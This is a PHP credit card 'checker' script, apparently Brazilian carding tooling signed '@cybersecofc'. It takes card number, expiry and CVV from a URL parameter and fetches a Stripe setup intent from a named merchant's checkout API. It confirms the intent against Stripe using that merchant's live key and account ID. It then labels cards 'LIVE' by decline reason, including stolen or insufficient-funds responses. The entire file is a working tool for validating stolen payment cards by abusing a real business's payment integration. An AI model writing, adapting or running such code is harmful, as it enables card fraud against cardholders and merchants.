<?php
error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);

function detectarBandeira($cc) {
    if (preg_match('/^4/', $cc)) return 'Visa';
    if (preg_match('/^5[1-5]/', $cc)) return 'Mastercard';
    if (preg_match('/^3[47]/', $cc)) return 'Amex';
    if (preg_match('/^6/', $cc)) return 'Elo';
    return 'Desconhecida';
}

$bandeira = detectarBandeira($cc);
$inicio = microtime(true);
$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0";



$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://reservaimovision.com.br/api/billings/setup_intent?page=checkouts&currency=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);


$headers = [
    'Host: reservaimovision.com.br',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: ' . $useragent,
    'accept: application/json',
    'tracestate: 6520289@nr=0-1-6520289-601537969-931dd275fd75e0a7----1777092297210',
    'referer: https://reservaimovision.com.br/checkout/new?o=127323',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,pt-PT;q=0.6,es;q=0.5',
    'if-none-match: W/"363ad0231ece2c92ed7acc83416309c3"',
    'priority: u=1, i',
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

$st1 = getStr($response, '"setup_intent":"', '"');
$st2 = getStr($response, '"setup_intent":"', '_secret_');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/' . $st2 . '/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api.stripe.com',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: ' . $useragent,
    'accept: application/json',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
]);

$postFields = http_build_query([
    'return_url' => 'https://reservaimovision.com.br/checkout/success?o=127323',
    'payment_method_data[type]' => 'card',
    'payment_method_data[card][number]' => $cc,
    'payment_method_data[card][cvc]' => $cvv,
    'payment_method_data[card][exp_year]' => $ano,
    'payment_method_data[card][exp_month]' => $mes,
    'payment_method_data[allow_redisplay]' => 'unspecified',
    'payment_method_data[billing_details][address][country]' => 'BR',
    'payment_method_data[payment_user_agent]' => 'stripe.js/332636417d; stripe-js-v3/332636417d; payment-element; deferred-intent; autopm',
    'payment_method_data[referrer]' => 'https://reservaimovision.com.br',
    'payment_method_data[time_on_page]' => '102603',
    'expected_payment_method_type' => 'card',
    'client_context[currency]' => 'brl',
    'client_context[mode]' => 'subscription',
    'client_context[setup_future_usage]' => 'off_session',
    'use_stripe_sdk' => 'true',
    'key' => 'pk_live_DImPqz7QOOyx70XCA9DSifxb',
    '_stripe_account' => 'acct_1H77ZcBceSQJJMEI',
    '_stripe_version' => '2024-12-18.acacia',
    'client_secret' => $st1,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);

$response2 = curl_exec($ch);
$httpcode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$tempo = number_format(microtime(true) - $inicio, 2);
$data2 = json_decode($response2, true);




if ($httpcode2 == 200 && isset($data2['status']) && $data2['status'] == 'succeeded') {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> PAGAMENTO CONFIRMADO! ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($response2, 'incorrect_cvc') !== false || strpos($response2, 'invalid_cvc') !== false || 
    strpos($response2, 'security_code') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - CVV INCORRETO ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($response2, 'insufficient_funds') !== false || strpos($response2, 'insufficient') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - SALDO INSUFICIENTE ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($response2, 'stolen_card') !== false || strpos($response2, 'lost_card') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - CARTAO BLOQUEADO ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($response2, 'do_not_honor') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - DO NOT HONOR ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($response2, 'expired_card') !== false || strpos($response2, 'expired') !== false) {
    die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> CARTAO EXPIRADO ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($response2, 'invalid_number') !== false || strpos($response2, 'incorrect_number') !== false) {
    die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> CARTAO INVALIDO ~> @cybersecofc ~> {$tempo}s");
}

$erroStripe = $data2['error']['message'] ?? ($data2['error']['decline_code'] ?? 'CARTÃO RECUSADO');
die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> $erroStripe ~> @cybersecofc ~> {$tempo}s");
?>